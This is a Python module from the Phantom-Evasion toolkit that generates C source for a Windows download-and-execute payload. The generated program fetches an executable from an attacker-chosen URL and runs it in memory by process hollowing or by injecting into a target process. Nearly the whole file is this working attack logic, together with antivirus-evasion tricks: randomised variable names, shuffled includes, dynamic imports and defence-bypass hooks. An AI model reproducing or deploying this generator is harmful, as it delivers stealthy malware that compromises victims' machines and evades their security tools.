
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #
     #    You should have received a copy of the GNU General Public License                 #
     #    along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.          #
     #                                                                                      #
     ########################################################################################

import sys
sys.path.append("Modules/payloads/auxiliar")

import inject_utils

from usefull import CryptFile
from usefull import varname_creator
from usefull import JunkInjector
from usefull import WindowsDefend
#from usefull import WindowsDecoyProc
#from usefull import CloseDecoyProc
from usefull import CheckForBackslash
from usefull import IncludeShuffler
from usefull import WriteSource


def DownloadExecExe_C_windows(ModOpt):

    UrlTarget = ModOpt["UrlTarget"]
    Filesize = ModOpt["Filesize"]

    RandvarFsize = varname_creator()
    Randsi = varname_creator()
    Randpi = varname_creator()
    RandTcontext = varname_creator()
    Randlpv = varname_creator()
    Randpointer = varname_creator()
    RandhInternet = varname_creator()
    RandhURL = varname_creator()
    RandvarBRead = varname_creator()
    RandvarBWritten = varname_creator()
    RandisRead = varname_creator()
    RandImgDosHeader = varname_creator()
    RandImgNTHeader = varname_creator()
    RandImgSectHeader = varname_creator()
    NdcNtUnmapViewofSection = varname_creator()
    RandlpProcImgBAddr = varname_creator()
    RandlpNewImgBAddr = varname_creator()
    RandrelocData = varname_creator()
    RandDelta = varname_creator()
    Randflag = varname_creator()
    Randflag2 = varname_creator()
    Randflag3 = varname_creator()
    RandSectName = varname_creator()
    RandRelocSectRawData = varname_creator()
    RandOffsetInRelocSect = varname_creator()
    RandEntryCount = varname_creator()
    RandPBlocks = varname_creator()
    RandFieldAddr = varname_creator()
    RandDwBuff = varname_creator()
    RandlOldProtect = varname_creator()
    RandlNewProtect = varname_creator()

    ModOpt["Lpvoid"] = Randlpv

    CryptFile(ModOpt)

    Ret_code = ""

    IncludeList = ["#include <stdlib.h>\n","#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <time.h>\n","#include <math.h>\n"]

    Ret_code += IncludeShuffler(IncludeList)

    Ret_code += "#include <tlhelp32.h>\n"
    Ret_code += "#include <wininet.h>\n"

    #if ModOpt["ExecMethod"] in ["Chimera","C"]:

    #Ret_code += "#define CountRelocationEntries(dwBlockSize) (dwBlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY)\n"

    if ModOpt["Outformat"] == "exe":

        Ret_code += "int main(int argc,char * argv[]){\n"

    elif ModOpt["Outformat"] == "dll":

        Ret_code += "BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD dwReason,LPVOID lpReserved){\n"
        Ret_code += "BOOL bReturnValue = TRUE;\n"
        Ret_code += "if(dwReason ==  DLL_PROCESS_ATTACH){\n"

    Ret_code += "$:START\n"

    Ret_code += WindowsDefend(ModOpt)

    #Ret_code += WindowsDecoyProc(ModOpt["DecoyProc"])

    Ret_code += "$:EVA\n"

    Ret_code += "STARTUPINFOA " + Randsi + ";\n"
    Ret_code += "PROCESS_INFORMATION " + Randpi + ";\n"
    Ret_code += "ZeroMemory(&" + Randsi + ", sizeof(" + Randsi + "));\n"
    Ret_code += Randsi + ".cb = sizeof(" + Randsi + ");\n"
    Ret_code += "ZeroMemory(&" + Randpi + ", sizeof(" + Randpi + "));\n"

    if ModOpt["DynImport"] == True:

        ModOpt["NtdllHandle"] = varname_creator()
        ModOpt["Ker32Handle"] = varname_creator()
        Wininet = varname_creator()

        Ret_code += "HANDLE " + ModOpt["NtdllHandle"] + " = GetModuleHandle(\"ntdll.dll\");\n"
        Ret_code += "HANDLE " + ModOpt["Ker32Handle"] + " = GetModuleHandle(\"kernel32.dll\");\n"
        Ret_code += "HANDLE " + Wininet + " = GetModuleHandle(\"wininet.dll\");\n"

    if ModOpt["ExecMethod"] in ["Chimera","C"]:

        RandhProcess = varname_creator()
        Randentry = varname_creator()
        RandProcsnapshot = varname_creator()
        Randlpv2 = varname_creator()

        Ret_code += "PROCESSENTRY32 " + Randentry + ";\n"
        Ret_code += Randentry + ".dwSize = sizeof(PROCESSENTRY32);\n"

        if ModOpt["DynImport"] == True:

            NdcTl32Snapshot = varname_creator()
            NdcProcess32First = varname_creator()
            NdcProcess32Next = varname_creator()
            NdcOpenProcess = varname_creator()

            Ret_code += "FARPROC " + NdcTl32Snapshot + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"CreateToolhelp32Snapshot\");\n"
            Ret_code += "HANDLE " + RandProcsnapshot + " = (HANDLE)" + NdcTl32Snapshot + "(TH32CS_SNAPPROCESS, 0);\n"
            Ret_code += "FARPROC " + NdcProcess32First + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"Process32First\");\n"
            Ret_code += "FARPROC " + NdcProcess32Next + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"Process32Next\");\n"
            Ret_code += "FARPROC " + NdcOpenProcess + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"OpenProcess\");\n"
            Ret_code += "if (" + NdcProcess32First + "(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
            Ret_code += "while (" + NdcProcess32Next + "(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
            Ret_code += "if(strcmp(" + Randentry + ".szExeFile, \"" + ModOpt["ProcTarget"] + "\") == 0){\n"
            Ret_code += "HANDLE " + RandhProcess + " = (HANDLE)" + NdcOpenProcess + "(PROCESS_ALL_ACCESS, FALSE, " + Randentry + ".th32ProcessID);\n"
        else:
            Ret_code += "HANDLE " + RandProcsnapshot + " = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n"
            Ret_code += "if (Process32First(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
            Ret_code += "while (Process32Next(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
            Ret_code += "if(strcmp(" + Randentry + ".szExeFile, \"" + ModOpt["ProcTarget"] + "\") == 0){\n"
            Ret_code += "HANDLE " + RandhProcess + " = OpenProcess(PROCESS_ALL_ACCESS, FALSE, " + Randentry + ".th32ProcessID);\n"

    elif ModOpt["ExecMethod"] == "ProcessHollowing" or ModOpt["ExecMethod"] == "PH":

        if ModOpt["DynImport"] == True:
            NdcCreateProcessA = varname_creator()
            Ret_code += "FARPROC " + NdcCreateProcessA + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"CreateProcessA\");\n"
            Ret_code += NdcCreateProcessA + "(0,\"" + ModOpt["ProcTarget"] + "\",0,0,0, CREATE_SUSPENDED,0,0,&" + Randsi + ",&" + Randpi + ");\n"
        else:
            Ret_code += "CreateProcessA(0,\"" + ModOpt["ProcTarget"] + "\",0,0,0, CREATE_SUSPENDED,0,0,&" + Randsi + ",&" + Randpi + ");\n"

        Ret_code += "CONTEXT " + RandTcontext + ";\n"
        Ret_code += RandTcontext + ".ContextFlags = CONTEXT_FULL;\n"

        if ModOpt["DynImport"] == True:

            NdcGetThreadContext = varname_creator()
            Ret_code += "FARPROC " + NdcGetThreadContext + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"GetThreadContext\");\n"
            Ret_code += "if (" + NdcGetThreadContext + "(" + Randpi + ".hThread,&" + RandTcontext + ") != 0){\n"
        else:
            Ret_code += "if (GetThreadContext(" + Randpi + ".hThread,&" + RandTcontext + ") != 0){\n"

    Ret_code += "int " + RandvarFsize + " = " + ModOpt["Filesize"] + ";\n"
    Ret_code += "DWORD " + RandvarBWritten + " = 0;\n"

    if ModOpt["DynImport"] == True:
        NdcInternetOpenA = varname_creator()
        NdcInternetOpenUrl = varname_creator()
        NdcVirtualAlloc = varname_creator()
        NdcInternetReadFile = varname_creator()
 
        Ret_code += "FARPROC " + NdcInternetOpenA + " = GetProcAddress(" + Wininet + ", \"InternetOpenA\");\n"
        Ret_code += "HINTERNET " + RandhInternet + " = (HINTERNET)" + NdcInternetOpenA + "(\"Mozilla/4.0\", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);\n"
        Ret_code += "if (" + RandhInternet + " != NULL){\n"
        Ret_code += "FARPROC " + NdcInternetOpenUrl + " = GetProcAddress(" + Wininet + ", \"InternetOpenUrl\");\n"
        Ret_code += "HINTERNET " + RandhURL + " = (HINTERNET)" + NdcInternetOpenUrl + "(" + RandhInternet + ",\"" + UrlTarget + "\",NULL, 0,INTERNET_FLAG_RESYNCHRONIZE, 0);\n"
        Ret_code += "FARPROC " + NdcVirtualAlloc + " = GetProcAddress(" + Wininet + ", \"VirtualAlloc\");\n"
        Ret_code += "unsigned char * " + Randlpv + " = (LPVOID)" + NdcVirtualAlloc + "(0," + RandvarFsize + ", MEM_COMMIT, PAGE_READWRITE);\n"
        Ret_code += "ZeroMemory(" + Randlpv + "," + RandvarFsize + ");\n"
        Ret_code += "char * " + Randpointer + " = " + Randlpv + ";\n"
        Ret_code += "DWORD " + RandvarBRead + ";\n"
        Ret_code += "do{\n"
        Ret_code += "FARPROC " + NdcInternetReadFile + " = GetProcAddress(" + Wininet + ", \"InternetReadFile\");\n"
        Ret_code += "BOOL " + RandisRead + " = " + NdcInternetReadFile + "(" + RandhURL + "," + Randpointer + ", 1024, &" + RandvarBRead + ");\n"
    else:
        Ret_code += "HINTERNET " + RandhInternet + " = InternetOpenA(\"Mozilla/4.0\", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);\n"
        Ret_code += "if (" + RandhInternet + " != NULL){\n"
        Ret_code += "HINTERNET " + RandhURL + " = InternetOpenUrl(" + RandhInternet + ",\"" + UrlTarget + "\",NULL, 0,INTERNET_FLAG_RESYNCHRONIZE, 0);\n"
        Ret_code += "unsigned char * " + Randlpv + " = VirtualAlloc(0," + RandvarFsize + ", MEM_COMMIT, PAGE_READWRITE);\n"
        Ret_code += "ZeroMemory(" + Randlpv + "," + RandvarFsize + ");\n"
        Ret_code += "char * " + Randpointer + " = " + Randlpv + ";\n"
        Ret_code += "DWORD " + RandvarBRead + ";\n"
        Ret_code += "do{\n"
        Ret_code += "BOOL " + RandisRead + " = InternetReadFile(" + RandhURL + "," + Randpointer + ", 1024, &" + RandvarBRead + ");\n"

    Ret_code += Randpointer + " += " + RandvarBRead + ";\n"
    Ret_code += "}while(" + RandvarBRead + " > 0);\n"

    if ModOpt["Decoder"] != "False":

        Ret_code += ModOpt["Decoder"]

    Ret_code += "typedef struct BASE_RELOCATION_BLOCK {"
    Ret_code += "DWORD PageAddress;"
    Ret_code += "DWORD BlockSize;"
    Ret_code += "} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;\n"

    Ret_code += "typedef struct BASE_RELOCATION_ENTRY {"
    Ret_code += "USHORT Offset : 12;"
    Ret_code += "USHORT Type : 4;"
    Ret_code += "} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;\n"

    Ret_code += "PIMAGE_DOS_HEADER " + RandImgDosHeader + ";\n"
    Ret_code += "PIMAGE_NT_HEADERS " + RandImgNTHeader + ";\n"
    Ret_code += "PIMAGE_SECTION_HEADER " + RandImgSectHeader + ";\n"
    Ret_code += RandImgDosHeader + " = (PIMAGE_DOS_HEADER)" + Randlpv + ";\n"


    if ModOpt["DynImport"] == True:

        NdcReadProcessMemory = varname_creator()
        NdcWriteProcessMemory = varname_creator()
        NdcVirtualAllocEx = varname_creator()
        NdcVirtualProtectEx = varname_creator()

        Ret_code += "FARPROC " + NdcReadProcessMemory + " = GetProcAddress(" + Wininet + ", \"ReadProcessMemory\");\n"
        Ret_code += "FARPROC " + NdcWriteProcessMemory + " = GetProcAddress(" + Wininet + ", \"WriteProcessMemory\");\n"
        Ret_code += "FARPROC " + NdcVirtualAllocEx + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"VirtualAllocEx\");\n"            
        Ret_code += "FARPROC " + NdcVirtualProtectEx + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"VirtualProtectEx\");\n"   


    if ModOpt["ExecMethod"] in ["ProcessHollowing","PH"]:

        Ret_code += "FARPROC " + NdcNtUnmapViewofSection + " = GetProcAddress(GetModuleHandle(\"ntdll.dll\"),\"NtUnmapViewOfSection\");\n"
        Ret_code += RandImgNTHeader + " = (PIMAGE_NT_HEADERS)((LPBYTE)" + Randlpv + " + " + RandImgDosHeader + "->e_lfanew);\n" 
        Ret_code += "LPVOID " + RandlpProcImgBAddr + ";\n"

        if ModOpt["Arch"] == "x86":

            if ModOpt["DynImport"] == True:

                Ret_code += NdcReadProcessMemory + "(" + Randpi + ".hProcess,(PVOID)(" + RandTcontext+ ".Ebx + 8), &" + RandlpProcImgBAddr + ", sizeof(" + RandlpProcImgBAddr + "), NULL);\n"

            else:

                Ret_code += "ReadProcessMemory(" + Randpi + ".hProcess,(PVOID)(" + RandTcontext+ ".Ebx + 8), &" + RandlpProcImgBAddr + ", sizeof(" + RandlpProcImgBAddr + "), NULL);\n"

        else:

            if ModOpt["DynImport"] == True:

                Ret_code += NdcReadProcessMemory + "(" + Randpi + ".hProcess,(PVOID)(" + RandTcontext+ ".Rdx+(sizeof(SIZE_T)*2)),&" + RandlpProcImgBAddr + ",sizeof(" + RandlpProcImgBAddr + "), NULL);\n"  #if x64 proc

            else:
                Ret_code += "ReadProcessMemory(" + Randpi + ".hProcess,(PVOID)(" + RandTcontext+ ".Rdx+(sizeof(SIZE_T)*2)),&" + RandlpProcImgBAddr + ",sizeof(" + RandlpProcImgBAddr + "), NULL);\n"

        Ret_code += "LPVOID " + RandlpNewImgBAddr + " = NULL;\n"
        Ret_code += "IMAGE_DATA_DIRECTORY " + RandrelocData + " = " + RandImgNTHeader + "->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];\n"
        Ret_code += "if(!(" + RandImgNTHeader + "->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) && " + RandrelocData + ".VirtualAddress!=0 && " + RandrelocData + ".Size!=0){\n"
        Ret_code += "if(!" + NdcNtUnmapViewofSection + "(" + Randpi + ".hProcess," + RandlpProcImgBAddr + ")){\n"

        if ModOpt["DynImport"] == True:

            Ret_code += RandlpNewImgBAddr + " = (LPVOID)" + NdcVirtualAllocEx + "(" + Randpi + ".hProcess," + RandlpProcImgBAddr + "," + RandImgNTHeader + "->OptionalHeader.SizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);\n"
            Ret_code += "}else{\n"
            Ret_code += RandlpNewImgBAddr + " = (LPVOID)" + NdcVirtualAllocEx + "(" + Randpi + ".hProcess,NULL," + RandImgNTHeader + "->OptionalHeader.SizeOfImage, MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);}\n"
            Ret_code += "}else{\n"
            Ret_code += RandlpNewImgBAddr + " = (LPVOID)" + NdcVirtualAllocEx + "(" + Randpi + ".hProcess, (PVOID)(" + RandImgNTHeader + "->OptionalHeader.ImageBase)," + RandImgNTHeader + "->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);\n"
            Ret_code += "if(!" + RandlpNewImgBAddr + "){\n"
            Ret_code += "if (!" + NdcNtUnmapViewofSection + "(" + Randpi + ".hProcess,(PVOID)(" + RandImgNTHeader + "->OptionalHeader.ImageBase))){\n"
            Ret_code += RandlpNewImgBAddr + " = (LPVOID)" + NdcVirtualAllocEx + "(" + Randpi + ".hProcess,(PVOID)(" + RandImgNTHeader + "->OptionalHeader.ImageBase)," + RandImgNTHeader + "->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);}}}\n"
        else:
            Ret_code += RandlpNewImgBAddr + " = VirtualAllocEx(" + Randpi + ".hProcess," + RandlpProcImgBAddr + "," + RandImgNTHeader + "->OptionalHeader.SizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);\n"
            Ret_code += "}else{\n"
            Ret_code += RandlpNewImgBAddr + " = VirtualAllocEx(" + Randpi + ".hProcess,NULL," + RandImgNTHeader + "->OptionalHeader.SizeOfImage, MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);}\n"
            Ret_code += "}else{\n"
            Ret_code += RandlpNewImgBAddr + " = VirtualAllocEx(" + Randpi + ".hProcess, (PVOID)(" + RandImgNTHeader + "->OptionalHeader.ImageBase)," + RandImgNTHeader + "->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);\n"
            Ret_code += "if(!" + RandlpNewImgBAddr + "){\n"
            Ret_code += "if (!" + NdcNtUnmapViewofSection + "(" + Randpi + ".hProcess,(PVOID)(" + RandImgNTHeader + "->OptionalHeader.ImageBase))){\n"
            Ret_code += RandlpNewImgBAddr + " = VirtualAllocEx(" + Randpi + ".hProcess,(PVOID)(" + RandImgNTHeader + "->OptionalHeader.ImageBase)," + RandImgNTHeader + "->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);}}}\n"


    elif ModOpt["ExecMethod"] in ["Chimera","C"]:
        #Ret_code += "FARPROC " + NdcNtUnmapViewofSection + " = GetProcAddress(GetModuleHandle(\"ntdll.dll\"),\"NtUnmapViewOfSection\");\n"
        Ret_code += RandImgNTHeader + " = (PIMAGE_NT_HEADERS)((LPBYTE)" + Randlpv + " + " + RandImgDosHeader + "->e_lfanew);\n" 
        #Ret_code += "LPVOID " + RandlpProcImgBAddr + ";\n"
        Ret_code += "LPVOID " + RandlpNewImgBAddr + " = NULL;\n"
        Ret_code += "IMAGE_DATA_DIRECTORY " + RandrelocData + " = " + RandImgNTHeader + "->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];\n"
        Ret_code += "if(!(" + RandImgNTHeader + "->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) && " + RandrelocData + ".VirtualAddress!=0 && " + RandrelocData + ".Size!=0){\n"
        #Ret_code += "if(!" + NdcNtUnmapViewofSection + "(" + Randpi + ".hProcess," + RandlpProcImgBAddr + ")){\n"

        if ModOpt["DynImport"] == True:

            #Ret_code += RandlpNewImgBAddr + " = " + NdcVirtualAllocEx + "(" + Randpi + ".hProcess," + RandlpProcImgBAddr + "," + RandImgNTHeader + "->OptionalHeader.SizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);\n"
            #Ret_code += "}else{\n"
            Ret_code += RandlpNewImgBAddr + " = (LPVOID)" + NdcVirtualAllocEx + "(" + Randpi + ".hProcess,NULL," + RandImgNTHeader + "->OptionalHeader.SizeOfImage, MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);\n"
            Ret_code += "}else{\n"
            Ret_code += RandlpNewImgBAddr + " = (LPVOID)" + NdcVirtualAllocEx + "(" + Randpi + ".hProcess, (PVOID)(" + RandImgNTHeader + "->OptionalHeader.ImageBase)," + RandImgNTHeader + "->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);\n"
            Ret_code += "if(!" + RandlpNewImgBAddr + ")return -1;}\n"
            #Ret_code += "if (!" + NdcNtUnmapViewofSection + "(" + Randpi + ".hProcess,(PVOID)(" + RandImgNTHeader + "->OptionalHeader.ImageBase))){\n"
            #Ret_code += RandlpNewImgBAddr + " = " + NdcVirtualAllocEx + "(" + Randpi + ".hProcess,(PVOID)(" + RandImgNTHeader + "->OptionalHeader.ImageBase)," + RandImgNTHeader + "->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);}}}\n"

        else:
            #Ret_code += RandlpNewImgBAddr + " = VirtualAllocEx(" + Randpi + ".hProcess," + RandlpProcImgBAddr + "," + RandImgNTHeader + "->OptionalHeader.SizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);\n"
            #Ret_code += "}else{\n"
            Ret_code += RandlpNewImgBAddr + " = VirtualAllocEx(" + Randpi + ".hProcess,NULL," + RandImgNTHeader + "->OptionalHeader.SizeOfImage, MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);\n"
            Ret_code += "}else{\n"
            Ret_code += RandlpNewImgBAddr + " = VirtualAllocEx(" + Randpi + ".hProcess, (PVOID)(" + RandImgNTHeader + "->OptionalHeader.ImageBase)," + RandImgNTHeader + "->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);\n"
            Ret_code += "if(!" + RandlpNewImgBAddr + ")return -1;}\n"
            #Ret_code += "if (!" + NdcNtUnmapViewofSection + "(" + Randpi + ".hProcess,(PVOID)(" + RandImgNTHeader + "->OptionalHeader.ImageBase))){\n"
            #Ret_code += RandlpNewImgBAddr + " = VirtualAllocEx(" + Randpi + ".hProcess,(PVOID)(" + RandImgNTHeader + "->OptionalHeader.ImageBase)," + RandImgNTHeader + "->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);}}}\n"


    Ret_code += "SIZE_T " + RandDelta + " = (SIZE_T)" + RandlpNewImgBAddr + "-" + RandImgNTHeader + "->OptionalHeader.ImageBase;\n"
    Ret_code += RandImgNTHeader + "->OptionalHeader.ImageBase = (SIZE_T)" + RandlpNewImgBAddr + ";\n"

    if ModOpt["DynImport"] == True:

        Ret_code += NdcWriteProcessMemory + "(" + Randpi + ".hProcess," + RandlpNewImgBAddr + "," + Randlpv + "," + RandImgNTHeader + "->OptionalHeader.SizeOfHeaders,NULL);\n"
        Ret_code += "for (int " + Randflag + "= 0;" + Randflag + "<" + RandImgNTHeader + "->FileHeader.NumberOfSections;" + Randflag + "++){\n"
        Ret_code += RandImgSectHeader + " = (PIMAGE_SECTION_HEADER)((LPBYTE)" + Randlpv + "+" + RandImgDosHeader + "->e_lfanew+sizeof(IMAGE_NT_HEADERS)+(" + Randflag + "*sizeof(IMAGE_SECTION_HEADER)));\n"
        Ret_code += NdcWriteProcessMemory + "(" + Randpi + ".hProcess,(PVOID)((LPBYTE)" + RandlpNewImgBAddr + "+" + RandImgSectHeader + "->VirtualAddress),(PVOID)((LPBYTE)" + Randlpv + "+" + RandImgSectHeader + "->PointerToRawData)," + RandImgSectHeader + "->SizeOfRawData, NULL);}\n"

    else:
        Ret_code += "WriteProcessMemory(" + Randpi + ".hProcess," + RandlpNewImgBAddr + "," + Randlpv + "," + RandImgNTHeader + "->OptionalHeader.SizeOfHeaders,NULL);\n"
        Ret_code += "for (int " + Randflag + "= 0;" + Randflag + "<" + RandImgNTHeader + "->FileHeader.NumberOfSections;" + Randflag + "++){\n"
        Ret_code += RandImgSectHeader + " = (PIMAGE_SECTION_HEADER)((LPBYTE)" + Randlpv + "+" + RandImgDosHeader + "->e_lfanew+sizeof(IMAGE_NT_HEADERS)+(" + Randflag + "*sizeof(IMAGE_SECTION_HEADER)));\n"
        Ret_code += "WriteProcessMemory(" + Randpi + ".hProcess,(PVOID)((LPBYTE)" + RandlpNewImgBAddr + "+" + RandImgSectHeader + "->VirtualAddress),(PVOID)((LPBYTE)" + Randlpv + "+" + RandImgSectHeader + "->PointerToRawData)," + RandImgSectHeader + "->SizeOfRawData, NULL);}\n"

    Ret_code += "if(" + RandDelta + " != 0){\n"
    Ret_code += "for (int " + Randflag2 + " = 0;" + Randflag2 + "<" + RandImgNTHeader + "->FileHeader.NumberOfSections;" + Randflag2 + "++){\n"
        #.reloc section
    Ret_code += "char* " + RandSectName + " = \".reloc\";\n"
    Ret_code += RandImgSectHeader + " = (PIMAGE_SECTION_HEADER)((LPBYTE)" + Randlpv + "+" + RandImgDosHeader + "->e_lfanew+sizeof(IMAGE_NT_HEADERS)+(" + Randflag2 + "*sizeof(IMAGE_SECTION_HEADER)));\n"
    Ret_code += "if(memcmp(" + RandImgSectHeader + "->Name, " + RandSectName + ",strlen(" + RandSectName + ")))continue;\n"
    Ret_code += "DWORD " + RandRelocSectRawData + " = " + RandImgSectHeader + "->PointerToRawData;\n"
    Ret_code += "DWORD " + RandOffsetInRelocSect + " = 0;\n"
    Ret_code += "IMAGE_DATA_DIRECTORY " + RandrelocData + " = " + RandImgNTHeader + "->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];\n"
    #relocation data
    Ret_code += "while(" + RandOffsetInRelocSect + "<" + RandrelocData + ".Size){\n"
    Ret_code += "PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)((SIZE_T)" + Randlpv + "+" + RandRelocSectRawData + "+" + RandOffsetInRelocSect + ");\n"
    Ret_code += RandOffsetInRelocSect + "+=sizeof(BASE_RELOCATION_BLOCK);\n"
    Ret_code += "DWORD " + RandEntryCount + " = pBlockheader->BlockSize - (sizeof(BASE_RELOCATION_BLOCK)) / (sizeof(BASE_RELOCATION_ENTRY));\n"
    Ret_code += "PBASE_RELOCATION_ENTRY " + RandPBlocks + " = (PBASE_RELOCATION_ENTRY)((SIZE_T)" + Randlpv + "+" + RandRelocSectRawData + "+" + RandOffsetInRelocSect + ");\n"
    Ret_code += "for(DWORD " + Randflag3 + " =0;" + Randflag3 + "<" + RandEntryCount + ";" + Randflag3 + "++){\n"
    Ret_code += RandOffsetInRelocSect + "+=sizeof(BASE_RELOCATION_ENTRY);\n"
    Ret_code += "if(" + RandPBlocks + "[" + Randflag3 + "].Type==0)continue;\n"
    Ret_code += "SIZE_T " + RandFieldAddr + " = pBlockheader->PageAddress + " + RandPBlocks + "[" + Randflag3 + "].Offset;\n"
    Ret_code += "SIZE_T " + RandDwBuff + " = 0;\n"

    if ModOpt["DynImport"] == True:

        Ret_code += NdcReadProcessMemory + "(" + Randpi + ".hProcess,(PVOID)((SIZE_T)" + RandlpNewImgBAddr + "+" + RandFieldAddr + "),&" + RandDwBuff + ",sizeof(SIZE_T),0);\n"
        Ret_code += RandDwBuff + "+=" + RandDelta + ";\n"
        Ret_code += NdcWriteProcessMemory + "(" + Randpi + ".hProcess,(PVOID)((SIZE_T)" + RandlpNewImgBAddr + "+" + RandFieldAddr + "),&" + RandDwBuff + ",sizeof(SIZE_T),NULL);}}}}\n"

        Ret_code += "DWORD " + RandlOldProtect + " = 0;\n"
        Ret_code += NdcVirtualProtectEx + "(" + Randpi + ".hProcess," + RandlpNewImgBAddr + "," + RandImgNTHeader + "->OptionalHeader.SizeOfHeaders,PAGE_READONLY, &" + RandlOldProtect + ");\n"

    else:

        Ret_code += "ReadProcessMemory(" + Randpi + ".hProcess,(PVOID)((SIZE_T)" + RandlpNewImgBAddr + "+" + RandFieldAddr + "),&" + RandDwBuff + ",sizeof(SIZE_T),0);\n"
        Ret_code += RandDwBuff + "+=" + RandDelta + ";\n"
        Ret_code += "WriteProcessMemory(" + Randpi + ".hProcess,(PVOID)((SIZE_T)" + RandlpNewImgBAddr + "+" + RandFieldAddr + "),&" + RandDwBuff + ",sizeof(SIZE_T),NULL);}}}}\n"
        Ret_code += "DWORD " + RandlOldProtect + " = 0;\n"
        Ret_code += "VirtualProtectEx(" + Randpi + ".hProcess," + RandlpNewImgBAddr + "," + RandImgNTHeader + "->OptionalHeader.SizeOfHeaders,PAGE_READONLY, &" + RandlOldProtect + ");\n"

    Ret_code += "for(int " + Randflag + " = 0;" + Randflag + "<" + RandImgNTHeader + "->FileHeader.NumberOfSections;" + Randflag + "++){\n"
    Ret_code += RandImgSectHeader + " = (PIMAGE_SECTION_HEADER)((LPBYTE)" + Randlpv + "+" + RandImgDosHeader + "->e_lfanew+sizeof(IMAGE_NT_HEADERS)+(" + Randflag + "*sizeof(IMAGE_SECTION_HEADER)));\n"
    Ret_code += "DWORD " + RandlNewProtect + " = 0;\n"
    Ret_code += "if ((" + RandImgSectHeader + "->Characteristics) & IMAGE_SCN_MEM_EXECUTE){\n"
    Ret_code += "if ((" + RandImgSectHeader + "->Characteristics) & IMAGE_SCN_MEM_READ){\n"
    Ret_code += "if ((" + RandImgSectHeader + "->Characteristics) & IMAGE_SCN_MEM_WRITE){\n"
    Ret_code += RandlNewProtect + " = PAGE_EXECUTE_READWRITE;\n"
    Ret_code += "}else{\n"
    Ret_code += RandlNewProtect + " = PAGE_EXECUTE_READ;}\n"
    Ret_code += "}else{\n"
    Ret_code += "if((" + RandImgSectHeader + "->Characteristics) & IMAGE_SCN_MEM_WRITE){\n"
    Ret_code += RandlNewProtect + " = PAGE_EXECUTE_WRITECOPY;\n"
    Ret_code += "}else{\n"
    Ret_code += RandlNewProtect + " = PAGE_EXECUTE;}}\n"
    Ret_code += "}else{\n"
    Ret_code += "if((" + RandImgSectHeader + "->Characteristics) & IMAGE_SCN_MEM_READ){\n"
    Ret_code += "if((" + RandImgSectHeader + "->Characteristics) & IMAGE_SCN_MEM_WRITE){\n"
    Ret_code += RandlNewProtect + " = PAGE_READWRITE;\n"
    Ret_code += "}else{\n"
    Ret_code += RandlNewProtect + " = PAGE_READONLY;}\n"
    Ret_code += "}else{\n"
    Ret_code += "if((" + RandImgSectHeader + "->Characteristics) & IMAGE_SCN_MEM_WRITE){\n"
    Ret_code += RandlNewProtect + " = PAGE_WRITECOPY;\n"
    Ret_code += "}else{\n"
    Ret_code += RandlNewProtect + " = PAGE_NOACCESS;}}}\n"
